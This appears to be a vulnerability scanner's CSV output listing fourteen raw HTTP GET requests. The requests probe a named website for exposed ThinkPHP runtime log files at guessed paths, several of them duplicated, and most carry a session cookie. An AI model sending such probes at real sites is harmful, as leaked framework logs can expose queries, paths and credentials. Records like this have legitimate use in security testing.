ID,网站地址,脚本,漏洞信息,请求类型,请求包
1,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /runtime/log/202101/05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
"
2,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /Home/Temp/log/202101/05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
3,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /runtime/index/log/202101/05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
4,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /runtime/admin/log/202101/05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
5,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /runtime/log/202101/05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
6,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /Home/Temp/log/202101/05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
7,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /runtime/index/log/202101/05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
8,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /runtime/admin/log/202101/05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
9,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /Temp/Logs/2021_01_05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
10,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /Runtime/Logs/Home/2021_01_05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
11,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /Runtime/Logs/2021_01_05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
12,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /Runtime/Logs/Common/2021_01_05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
13,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /Application/Runtime/Logs/Common/2021_01_05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
14,https://www.weimiao.cn/,plugins/thinkphp,thinkphp_log_find,GET,"GET /Application/Runtime/Logs/Home/2021_01_05.log HTTP/1.1
Host: www.weimiao.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=258e80fc073097bbab15ff817e4337c6
"
